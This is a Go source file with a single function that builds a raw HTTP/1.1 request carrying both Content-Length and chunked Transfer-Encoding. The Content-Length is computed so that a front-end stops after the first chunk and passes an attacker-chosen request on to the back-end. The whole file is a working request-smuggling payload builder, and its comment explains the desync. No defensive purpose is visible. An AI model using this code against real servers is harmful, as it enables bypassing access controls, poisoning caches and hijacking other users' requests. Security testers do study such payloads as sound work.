package netsec

import (
	"fmt"
	"strings"
)

// BuildDualHeaderRequest builds a raw HTTP/1.1 request that carries both
// Content-Length and Transfer-Encoding: chunked. The Content-Length is
// computed to cover exactly up to the end of the first chunk (size line,
// chunk data, and its trailing CRLF), so a front-end that truncates by
// Content-Length consumes precisely the first chunk and leaves the
// terminating chunk plus smuggled bytes to be parsed as the next request.
func BuildDualHeaderRequest(method, target, firstChunkData, smuggled string) []byte {
	var body strings.Builder
	fmt.Fprintf(&body, "%x\r\n%s\r\n", len(firstChunkData), firstChunkData)
	firstChunkLen := body.Len()
	body.WriteString("0\r\n\r\n")
	body.WriteString(smuggled)

	var req strings.Builder
	fmt.Fprintf(&req, "%s %s HTTP/1.1\r\n", method, target)
	req.WriteString("Host: gateway.internal\r\n")
	fmt.Fprintf(&req, "Content-Length: %d\r\n", firstChunkLen)
	req.WriteString("Transfer-Encoding: chunked\r\n")
	req.WriteString("\r\n")
	req.WriteString(body.String())
	return []byte(req.String())
}
